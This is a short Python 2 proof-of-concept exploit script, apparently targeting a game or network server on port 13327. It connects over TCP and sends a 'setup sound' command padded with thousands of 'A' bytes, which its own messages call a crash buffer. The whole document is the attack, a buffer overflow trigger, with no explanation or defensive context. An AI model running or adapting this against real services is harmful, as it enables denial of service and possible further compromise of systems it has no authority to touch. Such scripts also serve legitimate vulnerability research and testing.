#!/usr/bin/python
import socket

try:
	target='127.0.0.1'
	Tport=13327
	crash="\x41"*4379

	buffer="\x11(setup sound " + crash + "\x90\x00#"

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	print "{*} Sending crash buffer..."
	s.connect((target,Tport))
	data=s.recv(1024)
	print data
	s.send(buffer)
	print "{*} Buffer sent"
	s.close()
	print "{*} Connection CLosed"
except:
	print "[!] FAILED.Could no longer connect to host..."
print "Complete"
